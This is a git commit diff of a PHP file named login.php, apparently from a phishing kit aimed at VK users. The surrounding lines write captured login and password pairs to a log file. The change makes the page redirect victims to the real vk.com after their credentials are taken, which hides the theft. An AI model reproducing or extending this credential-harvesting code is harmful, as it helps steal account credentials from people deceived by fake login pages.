66ffdf6639fad1ffbc0093fc56121c178ef02d94
Izeick <metro_2033_nik@mail.ru>
2021-01-22 15:57:02 +0300

    Initial commit

--- login.php
+++ login.php
@@ -10,6 +10,6 @@ fwrite($log,"\n $Log:$Pass \n");
 
 fclose($log);
 
-echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/login?m=1&email=.&to=bG9naW4/bT0xJmVtYWlsPWYmdG89YVc1a1pYZ3VjR2h3'></head></html>";
+echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com'></head></html>";
 
 ?>
